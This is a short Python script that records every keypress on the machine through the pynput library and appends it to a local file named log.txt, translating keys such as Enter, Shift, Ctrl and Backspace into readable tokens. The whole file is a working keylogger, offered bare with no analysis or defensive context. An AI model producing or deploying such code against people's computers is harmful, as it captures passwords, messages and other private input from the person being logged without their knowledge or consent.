#w = write , r = read, a = append

from pynput.keyboard import Listener

def writeToFile(key):
    keydata=str(key)
    keydata=keydata.replace("'","")

    if keydata=="Key.enter":
        keydata="\\n"
    if keydata=="Key.space":
        keydata=" "
    if keydata=="Key.shift":
        keydata=""
    if keydata=="Key.shift_r":
        keydata="<Shift>"
    if keydata=="Key.ctrl":
        keydata="<Ctrl>"
    if keydata=="Key.ctrl_r":
        keydata="<Ctrl>"
    if keydata=="Key.backspace":
        keydata="<backspace>"
    if keydata=="Key.cmd":
        keydata="<Windows Key>"
    if keydata=="Key.tab":
        keydata="   "

    with open("log.txt", "a") as f:
        f.write(keydata)

with Listener(on_press=writeToFile) as l:
    l.join()

#